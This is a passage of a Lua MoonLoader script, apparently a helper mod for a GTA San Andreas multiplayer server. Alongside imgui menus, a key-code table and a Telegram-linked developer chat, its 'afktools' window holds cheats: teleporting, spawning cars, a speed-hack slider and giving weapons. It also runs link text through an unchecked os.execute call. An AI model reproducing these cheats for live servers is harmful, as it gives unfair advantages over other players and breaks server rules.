		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end
		        if imgui.Button(u8'Тестовое сообщение') then
                    sendTelegramNotification('Тестовое сообщение от '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) 
	            end
                imgui.SameLine()
                imgui.Text(u8'/help Список команд')
		        imgui.Separator()
                if imgui.Checkbox(u8'Авто перезаход', autorec) then
                    mainIni.main.autorec = autorec[0] 
                    mainIni.main.nickrecons = u8:decode(str(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))))
                    local ip, port = sampGetCurrentServerAddress()
                    mainIni.main.serverrecon = u8:decode(str(ip))
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                end
                if autorec[0] == false then
                    delaychectqaq = os.time()
                    pizdap = false
                end
                imgui.Text(u8'Настройка для автоматического перезахода\nпри отключении от сервера.')
            end
        elseif tab == 7 then
            imgui.SetCursorPos(imgui.ImVec2(95, 28)) 
            if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then 
                imgui.CenterText(u8'Команды скрипта')
                imgui.Separator()
                imgui.PushItemWidth(40)

                local inputs = {
                    { text = 'Запуска скрипта ', cmd = cmd1, id = "##1w", key = "cmd1" },
                    { text = 'Перезахода на сервер ', cmd = cmd2, id = "##2", key = "cmd2" },
                    { text = 'Связи с разработчиком ', cmd = cmd3, id = "##3w", key = "cmd3" },
                    { text = 'Развлечения ', cmd = cmd4, id = "##4w", key = "cmd4" },
                    { text = 'Быстрого набора номера ', cmd = cmd5, id = "##5w", key = "cmd5" },
                    { text = 'Для разработчиков ', cmd = cmd6, id = "##6w", key = "cmd6" }
                }

                for _, input in ipairs(inputs) do
                    imgui.Text(u8(input.text))
                    imgui.SameLine()
                    imgui.SetCursorPosX(180)
                    if imgui.InputText(u8(input.id), input.cmd, 256) then
                        mainIni.main[input.key] = u8:decode(str(input.cmd))
                        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                    end
                end

                imgui.PopItemWidth()
            end
            imgui.EndChild()
        end
        imgui.End()
    end)

local marketFrame = imgui.OnFrame(function() return not marketBool.always[0] and marketBool.now[0] and not isPauseMenuActive() and not sampIsScoreboardOpen() end, function(player) player.HideCursor = true
local sx, sy = getScreenResolution()
local position = marketPos.x ~= -1 and marketPos or imgui.ImVec2((sx - marketSize.x[0]) / 2, sy - marketSize.y[0] - sy * 0.01)
    imgui.SetNextWindowPos(position, imgui.Cond.Always)
    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(marketColor.text[0], marketColor.text[1], marketColor.text[2], fontAlpha[0]))
    imgui.PushStyleColor(imgui.Col.WindowBg, imgui.ImVec4(marketColor.window[0], marketColor.window[1], marketColor.window[2], marketAlpha[0]))
    imgui.Begin('market', market, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoTitleBar + imgui.WindowFlags.AlwaysAutoResize)
    imgui.SetWindowFontScale(fontSize[0])
    for i = #marketShop, 1, -1 do
        imgui.Text(u8(marketShop[i]))
    end
    imgui.End()
    imgui.PopStyleColor(2)
    end)

imgui.OnFrame(function() return showdebug[0] end, function(player)
        imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.Begin(bugti .. ' Debug', showdebug, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.AlwaysAutoResize)
        imgui.Checkbox(u8'3d text-key Q', debugwh3d)
        imgui.Checkbox(u8'id textdraw', textdrawid)
        imgui.SameLine()
        if imgui.Button(u8'Коды клавиш') then 
            idkeys[0] = not idkeys[0]
        end
        imgui.Separator()
        local function handleCopy(text, successMessage, errorMessage)
            if lang == "Ru" then
                setClipboardText(text)
                if smspush[0] == 1 then
                    sms(successMessage, 0x00BFFF)
                elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8(successMessage), toast.TYPE.DEBUG, 2)
                end
            else
                if smspush[0] == 1 then
                    sms(errorMessage, 0x00BFFF)
                elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8(errorMessage), toast.TYPE.ERROR, 2)
                end
            end
        end
        if onShowDialogwqq == '' then
            imgui.Text(u8('Dialog: Пусто'))
        else
            imgui.Text(u8(onShowDialogwqq))
            if imgui.IsItemHovered() then
                imgui.BeginTooltip()
                imgui.Text(u8'Клик что бы скопировать')
                imgui.EndTooltip()
            end
            if imgui.IsItemClicked() then
                handleCopy(onShowDialogwqq, 'Dialog Copy', 'Смените язык на русский')
            end
        end   
        imgui.Separator()
        local positionX, positionY, positionZ = getCharCoordinates(PLAYER_PED)
        local coordinates = string.format("%.2f, %.2f, %.2f", positionX, positionY, positionZ)
        imgui.Text(u8'Координаты')
        imgui.SameLine()
        imgui.Text(coordinates) 
        if imgui.IsItemHovered() then
            imgui.BeginTooltip()
            imgui.Text(u8'Клик что бы скопировать')
            imgui.EndTooltip()
        end
        if imgui.IsItemClicked() then  
            handleCopy(coordinates, 'Copy Координаты', 'Смените язык на русский')
        end
        imgui.End()
end).HideCursor = false

imgui.OnFrame(function() return idkeys[0] end, function(player)
    imgui.SetNextWindowPos(imgui.ImVec2(400,sh/2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5,0.5))
    imgui.SetNextWindowSize(imgui.ImVec2(355, 320), imgui.Cond.Always)
    imgui.Begin('ID-keys', idkeys, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.AlwaysAutoResize)
    local w = {
        first = 120,
        second = 110,
        free = 110,
    }
    local filter = imgui.ImGuiTextFilter()
    filter:Draw(u8"Поиск", 80)
    if filter:IsActive() then
        imgui.SameLine()
        if imgui.Button("Clear") then
            filter:Clear()
        end
    end
    imgui.Columns(3)
    imgui.Text(u8'Название клавиши') imgui.SetColumnWidth(-1, w.first)
    imgui.NextColumn()
    imgui.Text(u8'HEX код клавиши') imgui.SetColumnWidth(-1, w.second)
    imgui.NextColumn()
    imgui.Text(u8'DEC код клавиши') imgui.SetColumnWidth(-1, w.free)
    imgui.Columns(1)
    imgui.Separator()

local buttons = {
    { name = 'Left Button', hexCode = '0x01', number = '1' },
    { name = 'Right Button', hexCode = '0x02', number = '2' },
    { name = 'Break', hexCode = '0x03', number = '3' },
    { name = 'Middle Button', hexCode = '0x04', number = '4' },
    { name = 'X Button 1', hexCode = '0x05', number = '5' },
    { name = 'X Button 2', hexCode = '0x06', number = '6' },
    { name = 'Backspace', hexCode = '0x08', number = '8' },
    { name = 'TAB', hexCode = '0x09', number = '9' },
    { name = 'Clear', hexCode = '0x0C', number = '12' },
    { name = 'Enter', hexCode = '0x0D', number = '13' },
    { name = 'Shift', hexCode = '0x10', number = '16' },
    { name = 'Ctrl', hexCode = '0x11', number = '17' },
    { name = 'Alt', hexCode = '0x12', number = '18' },
    { name = 'Pause', hexCode = '0x13', number = '19' },
    { name = 'Caps Lock', hexCode = '0x14', number = '20' },
    { name = 'Kana', hexCode = '0x15', number = '21' },
    { name = 'Junja', hexCode = '0x17', number = '23' },
    { name = 'Final', hexCode = '0x18', number = '24' },
    { name = 'Kanji', hexCode = '0x19', number = '25' },
    { name = 'Esc', hexCode = '0x1B', number = '27' },
    { name = 'Convert', hexCode = '0x1C', number = '28' },
    { name = 'Non Convert', hexCode = '0x1D', number = '29' },
    { name = 'Accept', hexCode = '0x1E', number = '30' },
    { name = 'Mood Change', hexCode = '0x1F', number = '31' },
    { name = 'Space', hexCode = '0x20', number = '32' },
    { name = 'Page Up', hexCode = '0x21', number = '33' },
    { name = 'Page Down', hexCode = '0x22', number = '34' },
    { name = 'End', hexCode = '0x23', number = '35' },
    { name = 'Home', hexCode = '0x24', number = '36' },
    { name = 'Arrow Left', hexCode = '0x25', number = '37' },
    { name = 'Arrow Up', hexCode = '0x26', number = '38' },
    { name = 'Arrow Right', hexCode = '0x27', number = '39' },
    { name = 'Arrow Down', hexCode = '0x28', number = '40' },
    { name = 'Select', hexCode = '0x29', number = '41' },
    { name = 'Print', hexCode = '0x2A', number = '42' },
    { name = 'Execute', hexCode = '0x2B', number = '43' },
    { name = 'Print Screen', hexCode = '0x2C', number = '44' },
    { name = 'Insert', hexCode = '0x2D', number = '45' },
    { name = 'Delete', hexCode = '0x2E', number = '46' },
    { name = 'Help', hexCode = '0x2F', number = '47' },
    { name = '0', hexCode = '0x30', number = '48' },
    { name = '1', hexCode = '0x31', number = '49' },
    { name = '2', hexCode = '0x32', number = '50' },
    { name = '3', hexCode = '0x33', number = '51' },
    { name = '4', hexCode = '0x34', number = '52' },
    { name = '5', hexCode = '0x35', number = '53' },
    { name = '6', hexCode = '0x36', number = '54' },
    { name = '7', hexCode = '0x37', number = '55' },
    { name = '8', hexCode = '0x38', number = '56' },
    { name = '9', hexCode = '0x39', number = '57' },
    { name = 'A', hexCode = '0x41', number = '65' },
    { name = 'B', hexCode = '0x42', number = '66' },
    { name = 'C', hexCode = '0x43', number = '67' },
    { name = 'D', hexCode = '0x44', number = '68' },
    { name = 'E', hexCode = '0x45', number = '69' },
    { name = 'F', hexCode = '0x46', number = '70' },
    { name = 'G', hexCode = '0x47', number = '71' },
    { name = 'H', hexCode = '0x48', number = '72' },
    { name = 'I', hexCode = '0x49', number = '73' },
    { name = 'J', hexCode = '0x4A', number = '74' },
    { name = 'K', hexCode = '0x4B', number = '75' },
    { name = 'L', hexCode = '0x4C', number = '76' },
    { name = 'M', hexCode = '0x4D', number = '77' },
    { name = 'N', hexCode = '0x4E', number = '78' },
    { name = 'O', hexCode = '0x4F', number = '79' },
    { name = 'P', hexCode = '0x50', number = '80' },
    { name = 'Q', hexCode = '0x51', number = '81' },
    { name = 'R', hexCode = '0x52', number = '82' },
    { name = 'S', hexCode = '0x53', number = '83' },
    { name = 'T', hexCode = '0x54', number = '84' },
    { name = 'U', hexCode = '0x55', number = '85' },
    { name = 'V', hexCode = '0x56', number = '86' },
    { name = 'W', hexCode = '0x57', number = '87' },
    { name = 'X', hexCode = '0x58', number = '88' },
    { name = 'Y', hexCode = '0x59', number = '89' },
    { name = 'Z', hexCode = '0x5A', number = '90' },
    { name = 'Left Win', hexCode = '0x5B', number = '91' },
    { name = 'Right Win', hexCode = '0x5C', number = '92' },
    { name = 'Context Menu', hexCode = '0x5D', number = '93' },
    { name = 'Sleep', hexCode = '0x5F', number = '95' },
    { name = 'Numpad 0', hexCode = '0x60', number = '96' },
    { name = 'Numpad 1', hexCode = '0x61', number = '97' },
    { name = 'Numpad 2', hexCode = '0x62', number = '98' },
    { name = 'Numpad 3', hexCode = '0x63', number = '99' },
    { name = 'Numpad 4', hexCode = '0x64', number = '100' },
    { name = 'Numpad 5', hexCode = '0x65', number = '101' },
    { name = 'Numpad 6', hexCode = '0x66', number = '102' },
    { name = 'Numpad 7', hexCode = '0x67', number = '103' },
    { name = 'Numpad 8', hexCode = '0x68', number = '104' },
    { name = 'Numpad 9', hexCode = '0x69', number = '105' },
    { name = 'Numpad *', hexCode = '0x6A', number = '106' },
    { name = 'Numpad +', hexCode = '0x6B', number = '107' },
    { name = 'Sep', hexCode = '0x6C', number = '108' },
    { name = 'Num -', hexCode = '0x6D', number = '109' },
    { name = 'Numpad .', hexCode = '0x6E', number = '110' },
    { name = 'Numpad /', hexCode = '0x6F', number = '111' },
    { name = 'F1', hexCode = '0x70', number = '112' },
    { name = 'F2', hexCode = '0x71', number = '113' },
    { name = 'F3', hexCode = '0x72', number = '114' },
    { name = 'F4', hexCode = '0x73', number = '115' },
    { name = 'F5', hexCode = '0x74', number = '116' },
    { name = 'F6', hexCode = '0x75', number = '117' },
    { name = 'F7', hexCode = '0x76', number = '118' },
    { name = 'F8', hexCode = '0x77', number = '119' },
    { name = 'F9', hexCode = '0x78', number = '120' },
    { name = 'F10', hexCode = '0x79', number = '121' },
    { name = 'F11', hexCode = '0x7A', number = '122' },
    { name = 'F12', hexCode = '0x7B', number = '123' },
    { name = 'F13', hexCode = '0x7C', number = '124' },
    { name = 'F14', hexCode = '0x7D', number = '125' },
    { name = 'F15', hexCode = '0x7E', number = '126' },
    { name = 'F16', hexCode = '0x7F', number = '127' },
    { name = 'F17', hexCode = '0x80', number = '128' },
    { name = 'F18', hexCode = '0x81', number = '129' },
    { name = 'F19', hexCode = '0x82', number = '130' },
    { name = 'F20', hexCode = '0x83', number = '131' },
    { name = 'F21', hexCode = '0x84', number = '132' },
    { name = 'F22', hexCode = '0x85', number = '133' },
    { name = 'F23', hexCode = '0x86', number = '134' },
    { name = 'F24', hexCode = '0x87', number = '135' },
    { name = 'Num Lock', hexCode = '0x90', number = '144' },
    { name = 'Scrl Lock', hexCode = '0x91', number = '145' },
    { name = 'Jisho', hexCode = '0x92', number = '146' },
    { name = 'Mashu', hexCode = '0x93', number = '147' },
    { name = 'Touroku', hexCode = '0x94', number = '148' },
    { name = 'Loya', hexCode = '0x95', number = '149' },
    { name = 'Roya', hexCode = '0x96', number = '150' },
    { name = 'Left Shift', hexCode = '0xA0', number = '160' },
    { name = 'Right Shift', hexCode = '0xA1', number = '161' },
    { name = 'Left Ctrl', hexCode = '0xA2', number = '162' },
    { name = 'Right Ctrl', hexCode = '0xA3', number = '163' },
    { name = 'Left Alt', hexCode = '0xA4', number = '164' },
    { name = 'Right Alt', hexCode = '0xA5', number = '165' },
    { name = 'Browser Back', hexCode = '0xA6', number = '166' },
    { name = 'Browser Forward', hexCode = '0xA7', number = '167' },
    { name = 'Browser Refresh', hexCode = '0xA8', number = '168' },
    { name = 'Browser Stop', hexCode = '0xA9', number = '169' },
    { name = 'Browser Search', hexCode = '0xAA', number = '170' },
    { name = 'Browser Favorites', hexCode = '0xAB', number = '171' },
    { name = 'Browser Home', hexCode = '0xAC', number = '172' },
    { name = 'Volume Mute', hexCode = '0xAD', number = '173' },
    { name = 'Volume Down', hexCode = '0xAE', number = '174' },
    { name = 'Volume Up', hexCode = '0xAF', number = '175' },
    { name = 'Next Track', hexCode = '0xB0', number = '176' },
    { name = 'Previous Track', hexCode = '0xB1', number = '177' },
    { name = 'Stop', hexCode = '0xB2', number = '178' },
    { name = 'Play / Pause', hexCode = '0xB3', number = '179' },
    { name = 'Mail', hexCode = '0xB4', number = '180' },
    { name = 'Mediaplayer', hexCode = '0xB5', number = '181' },
    { name = 'App1', hexCode = '0xB6', number = '182' },
    { name = 'App2', hexCode = '0xB7', number = '183' },
    { name = '; :', hexCode = '0xBA', number = '186' },
    { name = '= +', hexCode = '0xBB', number = '187' },
    { name = ', <', hexCode = '0xBC', number = '188' },
    { name = '- _', hexCode = '0xBD', number = '189' },
    { name = '. >', hexCode = '0xBE', number = '190' },
    { name = '/ ?', hexCode = '0xBF', number = '191' },
    { name = '` ~', hexCode = '0xC0', number = '192' },
    { name = "Abnt C1", hexCode = "0xC1", number = 193 },
    { name = "Abnt C2", hexCode = "0xC2", number = 193 },
    { name = "[ {", hexCode = "0xDB", number = 219 },
    { name = "\\ |", hexCode = "0xDC", number = 220 },
    { name = "] }", hexCode = "0xDD", number = 221 },
    { name = "\\ \"", hexCode = "0xDE", number = 222 },
    { name = "! В§", hexCode = "0xDF", number = 223 },
    { name = "Ax", hexCode = "0xE1", number = 225 },
    { name = "> <", hexCode = "0xE2", number = 226 },
    { name = "IcoHlp", hexCode = "0xE3", number = 227 },
    { name = "Process", hexCode = "0xE5", number = 229 },
    { name = "IcoClr", hexCode = "0xE6", number = 230 },
    { name = "Packet", hexCode = "0xE7", number = 231 },
    { name = "Reset", hexCode = "0xE9", number = 233 },
    { name = "Jump", hexCode = "0xEA", number = 234 },
    { name = "OemPa1", hexCode = "0xEB", number = 235 },
    { name = "OemPa2", hexCode = "0xEC", number = 236 },
    { name = "OemPa3", hexCode = "0xED", number = 237 },
    { name = "WsCtrl", hexCode = "0xEE", number = 238 },
    { name = "Cu Sel", hexCode = "0xEF", number = 239 },
    { name = "Oem Attn", hexCode = "0xF0", number = 240 },
    { name = "Finish", hexCode = "0xF1", number = 241 },
    { name = "Copy", hexCode = "0xF2", number = 242 },
    { name = "Auto", hexCode = "0xF3", number = 243 },
    { name = "Enlw", hexCode = "0xF4", number = 244 },
    { name = "Back Tab", hexCode = "0xF5", number = 245 },
    { name = "Attn", hexCode = "0xF6", number = 246 },
    { name = "Cr Sel", hexCode = "0xF7", number = 247 },
    { name = "Ex Sel", hexCode = "0xF8", number = 248 },
    { name = "Er Eof", hexCode = "0xF9", number = 249 },
    { name = "Play", hexCode = "0xFA", number = 250 },
    { name = "Zoom", hexCode = "0xFB", number = 251 },
    { name = "Pa1", hexCode = "0xFD", number = 253 },
    { name = "OemClr", hexCode = "0xFE", number = 254 },

}
    for _, button in ipairs(buttons) do
        if filter:PassFilter(u8(button.name)) then
            createButtonRow(u8(button.name), u8(button.hexCode), button.number)
        end
    end
    imgui.End()
end)

local function renderStatus(label, status)
    imgui.Text(u8(label))
    imgui.SameLine()
    if status then
        imgui.TextColored(imgui.ImVec4(0.0, 1.0, 0.0, 1.0), u8"Включён")
    else
        imgui.TextColored(imgui.ImVec4(1.0, 0.0, 0.0, 1.0), u8"Выключен")
    end
end

local marketFramea = imgui.OnFrame(function() 
    return show[0] and not isPauseMenuActive() and not sampIsScoreboardOpen() 
end, function(player) 
    player.HideCursor = true
    local sx, sy = getScreenResolution()
    local position = marketPosa.x ~= -1 and marketPosa or imgui.ImVec2((sx - marketSizea.x[0]) / 2, sy - marketSizea.y[0] - sy * 0.01)
    
    imgui.SetNextWindowPos(position, imgui.Cond.Always)
    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(marketColora.text[0], marketColora.text[1], marketColora.text[2], fontAlphaa[0]))
    imgui.PushStyleColor(imgui.Col.WindowBg, imgui.ImVec4(marketColora.window[0], marketColora.window[1], marketColora.window[2], marketAlphaa[0]))
    imgui.Begin('informer', show, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoTitleBar + imgui.WindowFlags.AlwaysAutoResize)
    
    imgui.SetWindowFontScale(fontSizea[0])
    imgui.Text(u8" ID: "..idshow)
    imgui.SameLine()
    imgui.Text(u8" PING: "..ping)
    imgui.SameLine()
    imgui.Text(u8"FPS: "..fpsID)
    
    if infonline[0] then
        imgui.Text(u8("Онлайн за сессию: "..get_timer(sessiononline)..' '))
    end

    local qwerty_time = os.time()
    local qwerty_milliseconds = math.floor(os.clock() * 1000) % 1000
    local qwerty_time_with_ms = os.date("%H:%M:%S", qwerty_time)
    imgui.Text(u8(""..qwerty_time_with_ms))
    imgui.SameLine()
    local qwerty_timeMSK = os.time() - 3600
    local qwerty_millisecondsMSK = math.floor(os.clock() * 1000) % 1000
    local qwerty_time_with_msMSK = os.date("%H:%M:%S", qwerty_timeMSK)
    imgui.Text(u8("МСК: "..qwerty_time_with_msMSK))
   
    if infrender[0] then
        renderStatus("Рендер лавок", lavka[0])
    end
    if infradius[0] then
        renderStatus("Радиус лавок", radiuslavki[0])
    end
    if infclean[0] then
        renderStatus("Удаление Игроков", clean[0])
    end
    if infautoclean[0] then
        renderStatus("Авто-Удаление", autoclean[0])
    end
    if infautolavka[0] then
        renderStatus("Авто-Лавка", settingslavka[0])
    end

    imgui.End()
    imgui.PopStyleColor(2)
end)

imgui.OnFrame(function() return WinStateTG[0] end, function(player)
local chatnick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
    imgui.SetNextWindowPos(imgui.ImVec2(sw/2,sh/2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5,0.5))
    imgui.SetNextWindowSize(imgui.ImVec2(600, 315), imgui.Cond.Always)
    imgui.Begin(u8'Связь с разработчиком '..submarineti, WinStateTG, imgui.WindowFlags.NoResize)
    if imgui.BeginChild('Name', imgui.ImVec2(590, 250), true) then
        for _, message in ipairs(messageLog) do
            imgui.TextColoredRGB(message)  
        end
        imgui.SetScrollHereY(1.0)
        imgui.EndChild() 
    end
    imgui.PushItemWidth(549)
    imgui.InputTextWithHint(u8'##Ваш текстss', u8'Введите текст', chatinputField, 256)
    imgui.PopItemWidth()
    imgui.SameLine()
    if imgui.Button(sendtiq ..'##Отправить', imgui.ImVec2(35, 25)) then
        imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(255, 0, 255, 1))
        local message = "[" .. os.date('%H:%M:%S') .. "]{FFFF00}" .. chatnick .. ": {FFFFFF}" .. u8:decode(str(chatinputField))
        imgui.PopStyleColor(1)
        table.insert(messageLog, message)
        sendTG(message)
        chatinputField = new.char[256]("")
    end 
    imgui.End()
end)

imgui.OnFrame(function() return afktools[0] end,function(player)
        imgui.SetNextWindowPos(imgui.ImVec2(sw / 2 + 550, sh / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.Begin(u8'afktools', afktools, imgui.WindowFlags.NoResize + imgui.WindowFlags.AlwaysAutoResize + imgui.WindowFlags.NoMove)
        if imgui.BeginTabBar('Tabs') then
            if imgui.BeginTabItem(u8'Машины') then
                if imgui.BeginChild('Name', imgui.ImVec2(90, 215), true) then
                    local coordinates = {
                        {434.15, 2670.08, 59.56}, 
                        {2913.23, -1296.14, 10.55}, 
                        {-971.21, 1160.18, 30.39}, 
                        {-2813.45, -461.87, 6.73}, 
                        {2626.41, 45.68, 26.27}, 
                        {-2247.11, -1715.89, 479.97} 
                    }
                    local buttons = {
                        {label = 'Random', action = function()
                            local randomCoord = random(1, #coordinates)
                            setCharCoordinates(PLAYER_PED, table.unpack(coordinates[randomCoord]))
                            afktools[0] = false
                        end},
                        {label = 'LV', coords = coordinates[1]},
                        {label = 'LV2', coords = coordinates[3]},
                        {label = 'LS', coords = coordinates[2]},
                        {label = 'SF', coords = coordinates[4]},
                        {label = 'DB', coords = coordinates[5]},
                        {label = u8'чилиад', coords = coordinates[6]},
                    }
                    for _, button in ipairs(buttons) do
                        if imgui.Button(button.label, imgui.ImVec2(80, 25)) then
                            if button.action then
                                button.action()
                            else
                                setCharCoordinates(PLAYER_PED, table.unpack(button.coords))
                                afktools[0] = false
                            end
                        end
                    end
                    imgui.EndChild()
                end
                imgui.SameLine()
                if imgui.BeginChild('Машины', imgui.ImVec2(345, 215), true) then
                    local vehicles = {406, 411, 432, 510, 520, 522, 531, 535, 539, 557, 560, 562}
                    local vehicles = {406, 411, 432, 510, 520, 522, 531, 535, 539, 557, 560, 562}
                    local clicked = {} 
                    for _, vid in ipairs(vehicles) do
                        clicked[vid] = false
                    end
                    for i, vid in ipairs(vehicles) do
                        imgui.Image(_G["Vehicle_" .. vid], imgui.ImVec2(80, 50))
                        
                        if imgui.IsItemClicked() then
                            if not clicked[vid] then
                                virtmip = true
                                col1, col2 = 3, 3
                                CreateCar(vid)
                                setCharHealth(PLAYER_PED, 1000)
                                clicked[vid] = true
                                afktools[0] = false
                            end
                        else
                            clicked[vid] = false 
                        end
                        if i % 4 ~= 0 then
                            imgui.SameLine()
                        end
                    end
                    imgui.SliderFloat(u8'speed-hack boost', speedhackf, 1, 8)
                    if imgui.Button(u8'##Выключение', imgui.ImVec2(335, 10)) then
                        virtmip = false
                        afktools[0] = false
                    end
                    imgui.EndChild()
                end
                imgui.EndTabItem()
            end
            if imgui.BeginTabItem(u8'Оружие') then
                if imgui.BeginChild('Оружие', imgui.ImVec2(345, 215), true) then
                    local weapons = {
                        {id = 1, img = WEAPON_BRASSKNUCKLE, ammo = 1},
                        {id = 2, img = WEAPON_GOLFCLUB, ammo = 1},
                        {id = 3, img = WEAPON_NITESTICK, ammo = 1},
                        {id = 4, img = WEAPON_KNIFE, ammo = 1},
                        {id = 5, img = WEAPON_BAT, ammo = 1},
                        {id = 6, img = WEAPON_SHOVEL, ammo = 1},
                        {id = 7, img = WEAPON_POOLSTICK, ammo = 1},
                        {id = 8, img = WEAPON_KATANA, ammo = 1},
                        {id = 9, img = WEAPON_CHAINSAW, ammo = 1},
                        {id = 10, img = WEAPON_DILDO, ammo = 1},
                        {id = 11, img = WEAPON_DILDO2, ammo = 1},
                        {id = 12, img = WEAPON_VIBRATOR, ammo = 1},
                        {id = 13, img = WEAPON_VIBRATOR2, ammo = 1},
                        {id = 14, img = WEAPON_FLOWER, ammo = 1},
                        {id = 15, img = WEAPON_CANE, ammo = 1},
                        {id = 16, img = WEAPON_GRENADE, ammo = 1000},
                        {id = 17, img = WEAPON_TEARGAS, ammo = 1000},
                        {id = 18, img = WEAPON_MOLTOV, ammo = 1000},
                        {id = 22, img = WEAPON_COLT45, ammo = 1000},
                        {id = 23, img = WEAPON_SILENCED, ammo = 1000},
                        {id = 24, img = WEAPON_DEAGLE, ammo = 1000},
                        {id = 25, img = WEAPON_SHOTGUN, ammo = 1000},
                        {id = 26, img = WEAPON_SAWEDOFF, ammo = 1000},
                        {id = 27, img = WEAPON_SHOTGSPA, ammo = 1000},
                        {id = 28, img = WEAPON_UZI, ammo = 1000},
                        {id = 29, img = WEAPON_MP5, ammo = 1000},
                        {id = 30, img = WEAPON_AK47, ammo = 1000},
                        {id = 31, img = WEAPON_M4, ammo = 1000},
                        {id = 32, img = WEAPON_TEC9, ammo = 1000},
                        {id = 33, img = WEAPON_RIFLE, ammo = 1000},
                        {id = 34, img = WEAPON_SNIPER, ammo = 1000},
                        {id = 35, img = WEAPON_ROCKETLAUNCHER, ammo = 1000},
                        {id = 36, img = WEAPON_HEATSEEKER, ammo = 1000},
                        {id = 37, img = WEAPON_FLAMETHROWER, ammo = 1000},
                        {id = 38, img = WEAPON_MINIGUN, ammo = 1000},
                        {id = 39, img = WEAPON_SATCHEL, ammo = 1000},
                        {id = 41, img = WEAPON_SPRAYCAN, ammo = 1000},
                        {id = 42, img = WEAPON_FIREEXTINGUISHER, ammo = 1000},
                        {id = 43, img = WEAPON_CAMERA, ammo = 1000},
                        {id = 46, img = WEAPON_PARACHUTE, ammo = 1}
                    }
                    for i, weapon in ipairs(weapons) do
                        imgui.Image(weapon.img, imgui.ImVec2(50, 50))
                        if imgui.IsItemClicked() then
                            giveWeapon(weapon.id, weapon.ammo)
                        end
                        if i % 6 ~= 0 then
                            imgui.SameLine()
                        end
                    end
                    imgui.EndChild()
                end
                imgui.EndTabItem()
            end
            imgui.EndTabBar()
        end
        imgui.End()
    end
)


function imgui.TextQuestion(text)
    imgui.TextDisabled("(?)")
    if imgui.IsItemHovered() then
        imgui.BeginTooltip()
        imgui.PushTextWrapPos(450)
        imgui.TextUnformatted(text)
        imgui.PopTextWrapPos()
        imgui.EndTooltip()
    end
end

function imgui.ColoredButton(text,hex,trans,size)
local r,g,b = tonumber("0x"..hex:sub(1,2)), tonumber("0x"..hex:sub(3,4)), tonumber("0x"..hex:sub(5,6))
    if tonumber(trans) ~= nil and tonumber(trans) < 101 and tonumber(trans) > 0 then a = trans else a = 60 end
        imgui.PushStyleColor(imgui.Col.Button, imgui.ImVec4(r/255, g/255, b/255, a/100))
        imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(r/255, g/255, b/255, a/100))
        imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(r/255, g/255, b/255, a/100))
        local button = imgui.Button(text, size)
        imgui.PopStyleColor(3)
    return button
end

function imgui.CenterText(text)
    local width = imgui.GetWindowWidth()
    local height = imgui.GetWindowHeight()
    local calc = imgui.CalcTextSize(text)
    imgui.SetCursorPosX( width / 2 - calc.x / 2 )  
    imgui.Text(text)
end

function imgui.LinkText(link)
    imgui.Text(link)
    if imgui.IsItemClicked(0) then os.execute(("start %s"):format(link)) 
    end
end

function createButtonRow(buttonName, hexCode, number)
    local w = {
        first = 120,
        second = 110,
        free = 110,
    }
    imgui.Columns(3)
    imgui.Text(buttonName)
    imgui.SetColumnWidth(-1, w.first)
    imgui.NextColumn()
    imgui.Text(hexCode)
    imgui.SetColumnWidth(-1, w.second)
    imgui.NextColumn()
    imgui.Text(''..number)
    imgui.SetColumnWidth(-1, w.free)
    imgui.Columns(1)
    imgui.Separator()
end

function imgui.ActiveButton(name, ...)
    imgui.PushStyleColor(imgui.Col.Button, convertDecimalToRGBA(palette.accent1.color_500))
    imgui.PushStyleColor(imgui.Col.ButtonHovered, convertDecimalToRGBA(palette.accent1.color_400))
    imgui.PushStyleColor(imgui.Col.ButtonActive, convertDecimalToRGBA(palette.accent1.color_300))
    local result = imgui.Button(name, ...)
    imgui.PopStyleColor(3)
    return result
end

function imgui.TextColoredRGB(text)
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4
    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end
    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImVec4(r/255, g/255, b/255, a/255)
    end
    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
